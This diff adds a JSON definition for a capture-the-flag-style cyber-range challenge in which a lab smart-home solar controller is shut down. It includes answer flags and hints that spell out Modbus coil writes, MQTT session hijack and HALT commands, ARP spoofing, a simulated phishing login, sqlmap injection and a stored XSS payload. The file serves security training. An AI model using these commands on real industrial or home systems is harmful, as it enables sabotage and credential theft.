@@ -1,0 +1,112 @@
+{
+  "name": "Smart Home - PV Shutdown",
+  "id": "smart-home-pv",
+  "difficulty": "hard",
+  "category": "IoT Security / ICS / Cyber Range",
+  "description": "Realistic cyber range requiring professional penetration testing skills. Perform ARP spoofing, network MITM attacks, ICS protocol exploitation (Modbus/MQTT), phishing campaigns, and web application exploitation against a smart home PV controller.",
+  "tags": ["IoT", "PV", "SmartGrid", "modbus", "mqtt", "api-security", "ICS", "SCADA", "SQLi", "XSS", "session-hijacking", "MITM", "ARP-spoofing", "cyber-range"],
+  "estimated_time": "3-4 hours",
+  "learning_objectives": [
+    "Understand IoT and ICS security vulnerabilities",
+    "Exploit industrial protocols (Modbus TCP, MQTT)",
+    "Perform session hijacking and MITM attacks",
+    "Leverage web application vulnerabilities (SQLi, XSS)",
+    "Chain multiple attack techniques",
+    "Map attacks to MITRE ATT&CK for ICS"
+  ],
+  "mitre_attack": {
+    "tactics": ["Reconnaissance", "Initial Access", "Execution", "Credential Access", "Lateral Movement", "Collection", "Impact"],
+    "techniques": ["T1040", "T1046", "T1190", "T1566", "T1557.002", "T1110", "T1489", "T0802", "T0831", "T0836"]
+  },
+  "tasks": [
+    {
+      "id": "task1",
+      "name": "Reconnaissance",
+      "description": "Find the WiFi credentials used by the smart hub.",
+      "flag": "BSY{PV_RECON_9a7c9f3f9f}",
+      "points": 10,
+      "hints": [
+        "Call /wifi_scan to discover credentials.",
+        "Check /logs/recon.pcap to see the HTTP request to /wifi_scan.",
+        "This represents T1040 (Network Sniffing) in MITRE ATT&CK."
+      ]
+    },
+    {
+      "id": "task2",
+      "name": "Injection via Modbus TCP",
+      "description": "Use a Modbus TCP client to write to the inverter coil and stop production.",
+      "flag": "BSY{PV_INJECTION_135b2aee7c}",
+      "points": 20,
+      "hints": [
+        "Confirm you've performed network recon by calling /wifi_scan before attempting Modbus writes.",
+        "Use pymodbus to write coil 1 on port 15002: client.write_coil(1, True)",
+        "Enter the attacker container: docker compose exec attacker bash",
+        "Run: python3 /home/attacker/tools/attacker_modbus.py 172.20.0.65 15002"
+      ]
+    },
+    {
+      "id": "task3",
+      "name": "IoT Command: Halt PV production",
+      "description": "Use MQTT or REST API session to halt the PV system and confirm energy production stopped.",
+      "flag": "BSY{PV_HALT_4b7d0b6a8c}",
+      "points": 15,
+      "hints": [
+        "Check /status for the MQTT session token and use the attacker endpoints after ARP spoof.",
+        "Alternatively use the /api/login + /api/hub/command endpoints for a REST-based halt.",
+        "This represents T1489 (Service Stop) and T0831 (Manipulation of Control)."
+      ]
+    },
+    {
+      "id": "task4",
+      "name": "MQTT Session Hijack",
+      "description": "Intercept the MQTT status message, steal the session token and send a HALT command via MQTT.",
+      "flag": "BSY{PV_MQTT_HIJACK_7c8f1a}",
+      "points": 20,
+      "hints": [
+        "Perform ARP spoof via POST /do_arp_spoof to enable session capture.",
+        "Use mosquitto_sub to subscribe to pv/status and extract the session token from JSON.",
+        "Publish HALT command: mosquitto_pub -h 172.20.0.66 -t pv/control -m '{\"command\":\"HALT\",\"session\":\"<token>\"}'",
+        "This demonstrates T1557.002 (Man-in-the-Middle via ARP) and T1040 (Network Sniffing)."
+      ]
+    },
+    {
+      "id": "task5",
+      "name": "REST API Session Hijack",
+      "description": "Find credentials (via phishing) and use them to login and call the hub REST API to halt the PV.",
+      "flag": "BSY{PV_REST_HIJACK_22cd3b9d}",
+      "points": 20,
+      "hints": [
+        "Simulate phishing: POST /phish with {\"username\":\"admin\",\"password\":\"super-secret-123\"}",
+        "Retrieve stolen creds from /attacker/creds (requires phishing or ARP spoof).",
+        "Login via /api/login, then use the Bearer token to POST /api/hub/command with {\"command\":\"HALT\"}",
+        "This represents T1566 (Phishing) and T1078 (Valid Accounts)."
+      ]
+    },
+    {
+      "id": "task6",
+      "name": "Vulnerable Admin Panel",
+      "description": "The admin dashboard is intentionally vulnerable to SQL injection and stored XSS. Use real tools to exploit it.",
+      "flag": "BSY{PV_DASH_7e3a56}",
+      "points": 15,
+      "hints": [
+        "SQL Injection: Use sqlmap against /api/admin/login to extract the users table.",
+        "Example: sqlmap -u 'http://172.20.0.65/api/admin/login' --data 'username=admin&password=admin' --batch --dump",
+        "Stored XSS: POST /api/admin/devices with {\"name\":\"<script>alert(1)</script>\",\"description\":\"xss\"}",
+        "Open admin dashboard at http://172.20.0.65/admin to trigger XSS. Victim container will detect it.",
+        "This demonstrates T1190 (Exploit Public-Facing Application)."
+      ]
+    }
+  ],
+  "enforceEventOrder": true,
+  "tools_required": [
+    "curl",
+    "docker",
+    "docker-compose",
+    "pymodbus (in attacker container)",
+    "mosquitto_pub/mosquitto_sub (in attacker container)",
+    "sqlmap (optional, in attacker container)",
+    "Wireshark (for traffic analysis)"
+  ],
+  "related_class": "class10"
+}
+
